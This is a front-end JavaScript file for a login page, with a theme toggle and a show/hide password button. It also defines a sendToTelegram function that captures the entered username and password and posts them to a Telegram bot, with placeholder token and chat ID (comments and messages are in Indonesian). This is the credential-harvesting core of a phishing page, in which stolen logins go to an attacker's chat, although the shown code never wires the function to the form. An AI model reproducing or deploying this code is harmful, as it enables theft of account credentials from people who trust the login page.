document.addEventListener('DOMContentLoaded', function() {
    // Check for saved theme preference or use system preference
    const savedTheme = localStorage.getItem('theme');
    const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
    
    if (savedTheme) {
        document.documentElement.setAttribute('data-theme', savedTheme);
    } else if (systemPrefersDark) {
        document.documentElement.setAttribute('data-theme', 'dark');
    }
    
    // Set the toggle switch position
    const themeSwitch = document.getElementById('theme-switch');
    const currentTheme = document.documentElement.getAttribute('data-theme');
    themeSwitch.checked = currentTheme === 'dark';
    
    // Toggle theme when switch is clicked
    themeSwitch.addEventListener('change', function() {
        if (this.checked) {
            document.documentElement.setAttribute('data-theme', 'dark');
            localStorage.setItem('theme', 'dark');
        } else {
            document.documentElement.setAttribute('data-theme', 'light');
            localStorage.setItem('theme', 'light');
        }
    });
    
    // Show/hide password functionality
    const showPasswordButtons = document.querySelectorAll('.show-password');
    showPasswordButtons.forEach(button => {
        button.addEventListener('click', function() {
            const input = this.parentElement.querySelector('input');
            if (input.type === 'password') {
                input.type = 'text';
                this.textContent = 'Hide';
            } else {
                input.type = 'password';
                this.textContent = 'Show';
            }
        });
    });
    
    // Listen for system theme changes
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
        if (!localStorage.getItem('theme')) {
            const newTheme = e.matches ? 'dark' : 'light';
            document.documentElement.setAttribute('data-theme', newTheme);
            themeSwitch.checked = e.matches;
        }
    });
    
    // // Form submission (prevent default for demo)
    // const loginForm = document.querySelector('.login-form');
    // loginForm.addEventListener('submit', function(e) {
    //     e.preventDefault();
    //     alert('Login functionality would be implemented here in a real application.');
    // });

    function sendToTelegram(e) {
        e.preventDefault();
    
        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;
    
        const message = `📥 Login Baru:\nUsername: ${username}\nPassword: ${password}`;
        const botToken = 'ISI_TOKEN_BOT_KAMU';
        const chatId = 'ISI_CHAT_ID_KAMU';
    
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: `chat_id=${chatId}&text=${encodeURIComponent(message)}`
        })
        .then(() => {
            alert("✅ Data berhasil dikirim ke Telegram!");
        })
        .catch(err => {
            alert("❌ Gagal mengirim data.");
            console.error(err);
        });
    }
});
